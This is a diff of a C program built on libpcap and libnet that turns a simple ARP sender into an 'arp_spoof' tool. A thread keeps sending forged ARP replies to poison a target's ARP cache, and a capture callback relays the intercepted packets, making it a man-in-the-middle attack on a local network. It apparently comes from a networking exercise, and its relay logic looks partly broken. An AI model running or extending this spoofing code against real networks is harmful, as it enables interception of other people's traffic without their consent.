@@ -6,25 +6,44 @@
 #include<stdlib.h>
 #include<stdint.h>
 #include<sys/socket.h>
+#include<pthread.h>
 
 #define AF_LINK AF_PACKET
 #define SIZE_OF_ETHERNET 14
+#define SIZE_OF_IPV4 20
+#define SIZE_OF_TCP 20
 #define SIZE_OF_ARP 8
 #define PACKET_SIZE 42
 
-struct ip_address{
+struct ip_address{ 
 	u_char ar_sha[6];
 	u_char ar_spa[4];
 	u_char ar_tha[6];
 	u_char ar_tpa[4];
 };
 
+struct thread_argument{
+	char*sender_mac;
+	char*sender_ip;
+	char*target_mac;
+	char*target_ip;
+};
+
 pcap_t* handle;
+
+struct target{
+	char sender_mac[6];
+	char sender_ip[20];
+	char target_mac[6];
+	char target_ip[20];
+}target;
+
+char myip[20],mymac[6];
 
 void usage()
 {
-	printf("usage  : sudo ./send_arp <interface> <sender ip> <target ip>\n");
-	printf("sample : sudo ./send_arp eth0 192.168.0.2 192.168.0.1\n");
+	printf("usage  : sudo ./arp_spoof <interface> <sender ip> <target ip>\n");
+	printf("sample : sudo ./arp_spoof eth0 192.168.0.2 192.168.0.1\n");
 }
 
 void print_mac(uint8_t*mac)
@@ -42,13 +61,6 @@ void find_target_mac(char*dev,char*my_ip, char*my_mac, char*target_ip, char*targ
 	struct ip_address*ipaddr=0;
 	u_char packet[PACKET_SIZE+1]={};
 	const u_char* packet_reply=0;
-
-	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
-	if(handle == NULL)
-	{
-		printf("[-]Couldn't open device %s: %s\n",dev,errbuf);
-		exit(1);
-	}
 	
 	ethhdr = (struct libnet_ethernet_hdr*)packet;
 	memset(ethhdr->ether_dhost,'\xff',6);
@@ -80,7 +92,7 @@ void find_target_mac(char*dev,char*my_ip, char*my_mac, char*target_ip, char*targ
 		packet_reply = pcap_next(handle,&header);
 		if(packet_reply == NULL)
 		{
-			printf("[-]Couldn't get packet\n");
+			printf("[-]Failed to get next packet\n");
 			exit(1);
 		}
 		
@@ -95,21 +107,22 @@ void find_target_mac(char*dev,char*my_ip, char*my_mac, char*target_ip, char*targ
 	printf("[*]Target Mac  : ");
 	print_mac(ipaddr->ar_sha);
 	memcpy(target_mac, ipaddr->ar_sha, 6);
-
 }
 
-void fake_arp_reply(char*sender_ip,char*sender_mac,char*target_ip,char*target_mac)
+void *fake_arp_reply(void*argv)
 {
+	struct thread_argument *tharg = (struct thread_argument*)argv;
+
 	struct libnet_ethernet_hdr*ethhdr=0;
 	struct libnet_arp_hdr*arphdr=0;
 	struct ip_address*ipaddr=0;
 	u_char packet[PACKET_SIZE+1]={};
 
 	ethhdr = (struct libnet_ethernet_hdr*)packet;
-	memcpy(ethhdr->ether_dhost,target_mac,6);
-	memcpy(ethhdr->ether_shost,sender_mac,6);
+	memcpy(ethhdr->ether_dhost,tharg->target_mac,6);
+	memcpy(ethhdr->ether_shost,tharg->sender_mac,6);
 	ethhdr->ether_type = htons(ETHERTYPE_ARP);
-	 
+	
 	arphdr = (struct libnet_arp_hdr*)(packet + SIZE_OF_ETHERNET);
 	arphdr->ar_hrd = htons(ARPHRD_ETHER);
 	arphdr->ar_pro = htons(ETHERTYPE_IP);
@@ -118,19 +131,92 @@ void fake_arp_reply(char*sender_ip,char*sender_mac,char*target_ip,char*target_ma
 	arphdr->ar_op  = htons(ARPOP_REPLY);
 
 	ipaddr = (struct ip_address*)((char*)arphdr + SIZE_OF_ARP);
-	memcpy(ipaddr->ar_sha,sender_mac,6);
-	inet_pton(AF_INET, sender_ip, &ipaddr->ar_spa);
-	memcpy(ipaddr->ar_tha,target_mac,6);
-	inet_pton(AF_INET, target_ip, &ipaddr->ar_tpa);
+	memcpy(ipaddr->ar_sha,tharg->sender_mac,6);
+	inet_pton(AF_INET, tharg->sender_ip, &ipaddr->ar_spa);
+	memcpy(ipaddr->ar_tha,tharg->target_mac,6);
+	inet_pton(AF_INET, tharg->target_ip, &ipaddr->ar_tpa);
 	 
-	if(pcap_sendpacket(handle, packet, PACKET_SIZE)==-1)
+	while(true)
 	{
-	  printf("[-]Failed to send packet\n");
-	  exit(1);
+		if(pcap_sendpacket(handle, packet, PACKET_SIZE)==-1)
+		{
+			printf("[-]Failed to send packet to %s\n",tharg->target_ip);
+			exit(1);
+		}
+		printf("[+]Success to send Fake ARP Reply to %s\n",tharg->target_ip);
+		sleep(5);
 	}
-
-	printf("[+]Succes to send Fake ARP Reply\n");
+	return 0;
 }
+
+void receive_and_relay(u_char*usr,const struct pcap_pkthdr *header,const u_char*packet)
+{
+	printf("[+]Receiving Spoofed IP Packet\n");
+
+	struct libnet_ethernet_hdr*ethhdr=0;
+	struct libnet_arp_hdr*arphdr=0;
+	struct libnet_ipv4_hdr*iphdr=0;
+	struct libnet_tcp_hdr*tcphdr=0;
+	struct ip_address*ipaddr=0;
+
+	ethhdr = (struct libnet_ethernet_hdr*)packet;
+	if(ntohs(ethhdr->ether_type)==ETHERTYPE_ARP)
+	{
+		arphdr = (struct libnet_arp_hdr*)(packet + SIZE_OF_ETHERNET);
+		ipaddr = (struct ip_address*)((char*)arphdr + SIZE_OF_ARP);
+		
+		char target_ip_net[4];
+		char sender_ip_net[4];
+		
+		inet_pton(AF_INET, target.target_ip, &target_ip_net);
+		inet_pton(AF_INET, target.sender_ip, &sender_ip_net);
+		if(memcmp(ipaddr->ar_sha,target_ip_net,4)==0 && 
+				memcmp(ipaddr->ar_tha,sender_ip_net,4)==0)
+		{
+			printf("[*]Relaying IP Packet");
+			memcpy(ethhdr->ether_shost,mymac,6);
+		}
+
+		if(pcap_sendpacket(handle,packet,header->len)==-1)
+		{
+			printf("[-]Failed to send packet\n");
+		}
+	}
+	/*
+	ethhdr = (struct libnet_ethernet_hdr*)packet;
+	printf("[*]----------------------------\n");
+	printf("[*]SRC MAC : ");
+	print_mac(ethhdr->ether_shost);
+	printf("[*]DST MAC : ");
+	print_mac(ethhdr->ether_dhost);
+	printf("[*]ETHERTYPE = 0x%04X", ntohs(ethhdr->ether_type));
+	
+	if(ntohs(ethhdr->ether_type)!=ETHERTYPE_IP)
+	{
+		printf("\n[-]Ether type is not IP\n");
+		return;
+	}
+	iphdr = (struct libnet_ipv4_hdr*)(packet + SIZE_OF_ETHERNET);
+	printf("\n[*]SRC IP : %s", inet_ntoa(iphdr->ip_src));
+	printf("\n[*]DST IP : %s", inet_ntoa(iphdr->ip_dst));
+	printf("\n[*]IP_P   : %d", iphdr->ip_p);
+	
+	if(iphdr->ip_p!=0x06)
+	{
+		printf("\n[-]IP Protocol is not TCP\n");
+		return;
+	}
+	tcphdr = (struct libnet_tcp_hdr*)(iphdr + SIZE_OF_IPV4);
+	printf("\n[*]SRC PORT : %d",ntohs(tcphdr->th_sport));
+	printf("\n[*]DST PORT : %d",ntohs(tcphdr->th_dport));
+	
+	char*data = (char*)(tcphdr + SIZE_OF_TCP);
+	int bytes = header->len - SIZE_OF_ETHERNET - SIZE_OF_IPV4 - SIZE_OF_TCP;
+	bytes = 16<bytes?16:bytes;
+	for(int i=0;i<bytes;i++)printf("%X",data[i]);*/
+	printf("[+]%u bytes captured\n\n",header->len);
+}
+
 
 int main(int argc, char **argv)
 {
@@ -139,11 +225,10 @@ int main(int argc, char **argv)
 		usage();
 		return -1;
 	}
-	printf("[+]Send_ARP\n");
+	printf("[+]ARP_SPOOF\n");
 	char dev[8],errbuf[PCAP_ERRBUF_SIZE];
 	uint32_t mask, net;
 	struct in_addr addr;
-	char myip[20],mymac[6];
 
 	strncpy(dev,argv[1],8);
 	if(dev == NULL)
@@ -154,9 +239,8 @@ int main(int argc, char **argv)
 
 	printf("[*]Device Name : %s\n",dev);
 	
-	char senderip[20],targetip[20],targetmac[6];
-	strncpy(senderip,argv[2],18);
-	strncpy(targetip,argv[3],18);
+	strncpy(target.sender_ip,argv[2],18);
+	strncpy(target.target_ip,argv[3],18);
 
 	pcap_if_t *alldev;
 	bool mac_ok=false,ip_ok=false;
@@ -188,17 +272,39 @@ int main(int argc, char **argv)
 		break;
 	}
 	pcap_freealldevs(alldev);
+	
+	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+	if(handle == NULL)
+	{
+	  printf("[-]Couldn't open device %s: %s\n",dev,errbuf);
+	  return 1;
+	}
 
 	printf("[*]My IP       : %s\n",myip);
 	printf("[*]My Mac      : ");
 	print_mac((uint8_t*)mymac);
-	printf("[*]Sender IP   : %s\n",senderip);
-	printf("[*]Target IP   : %s\n",targetip);
+	printf("[*]Sender IP   : %s\n",target.sender_ip);
+	printf("[*]Target IP   : %s\n",target.target_ip);
 	puts("");
-	find_target_mac(dev,myip,mymac,targetip,targetmac);
+
+	find_target_mac(dev,myip,mymac,target.target_ip,target.target_mac);
 	puts("");
-	fake_arp_reply(senderip,mymac,targetip,targetmac);
-	puts("");
+
+	pthread_t thread;
+	struct thread_argument th_arg;
+	th_arg.sender_ip = target.sender_ip;
+	th_arg.sender_mac = mymac;
+	th_arg.target_ip = target.target_ip;
+	th_arg.target_mac = target.target_mac;
+
+	pthread_create(&thread, NULL, &fake_arp_reply, (void *)&th_arg);
+	
+	int cnt;
+	if(pcap_loop(handle,-1,receive_and_relay,(u_char*)&cnt)==-1)
+	{
+		printf("[-]Can't find next packet\n");
+		return 1;
+	}
+	
+	return 0;
 }
-
-
